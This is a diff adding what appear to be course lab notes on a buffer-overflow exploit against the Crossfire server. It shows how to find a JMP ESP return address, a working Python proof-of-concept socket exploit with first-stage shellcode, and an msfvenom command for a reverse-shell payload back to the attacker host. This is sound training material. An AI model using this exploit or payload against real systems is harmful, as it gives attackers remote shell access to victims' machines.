@@ -178,3 +178,83 @@ This unfortunately required a bit of trial and error, as the lines containing ba
 `\x20` and `x00`
 
 ![[Pasted image 20220714171745.png]]
+
+
+
+# 12.6.1 Finding a Return Address
+#### Exercises
+_(To be performed on your own Kali and Debian lab client machines - Reporting is required for these exercises)_
+
+**1.  Find a suitable assembly instruction address for the exploit using EDB.**
+
+The last step is to locate an assembly instruction to redirect code execution to the memory location pointed to by the ESP register. To do this we will use "OpcodeSearcher"
+
+![[Pasted image 20220714180634.png]]
+
+Once we complete the search we can use the first JMP ESP we find. We have fouind a suitable assembly instruction located at 0x08134596.
+![[Pasted image 20220714180732.png]]
+
+
+
+
+
+**2.  Include the first stage shellcode and return address instruction in your proof-of-concept and ensure that the first stage shellcode is working as expected by single stepping through it in the debugger.**
+
+To start, we restart the edb application and set a breakpoint at our JMP ESP return address, using the edb breakpoint manager plugin. We simply click the "Add Breakpoint" button and paste in the address of our JMP ESP instruction, 0x08134596
+![[Pasted image 20220714181129.png]]
+
+Now we can close the breakpoint plugin and start the application with F9.
+
+The next step would be to update our PoC with our new EIP register. The following PoC will be used:
+
+```python
+#!/usr/bin/python3
+import socket
+
+ip = "192.168.233.44"
+port = 13327
+
+crash = "\x41" * 4368
+eip = "\x96\x45\x13\x08"
+first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"
+
+inputBuffer = crash + eip + first_stage
+
+buffer = "\x11(setup sound " + inputBuffer + "\x90\x00#"
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
+```
+
+We can see that our program stopped at our breakpoint.
+![[Pasted image 20220714181837.png]]
+
+ This allows us to step into the JMP ESP instruction and land in our first stage shellcode.
+![[Pasted image 20220714181933.png]]
+
+Stepping once again and we see that our EAX register now points to the start of our buffer, skipping over the "setup sound " bytes 
+
+![[Pasted image 20220714182131.png]]
+
+Finally, the next step lands us into a clean section of "A" characters right at the start of our buffer.
+![[Pasted image 20220714182307.png]]
+
+
+# 12.7.1 Getting a shell
+#### Exercises
+
+_(To be performed on your own Kali and Debian lab client machines - Reporting is required for these exercises)_
+
+1.  Update your proof-of-concept to include a working payload.
+All we need to do now is create a reverse shell payload and place it at the start of our "A" buffer. To generate this payload we will use the following msfvenom payload:
+`msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.233 LPORT=9000 -b "\x00\x20" -f python -v shellcode`
+
+
+2.  Obtain a shell from the Crossfire application with and without a debugger.
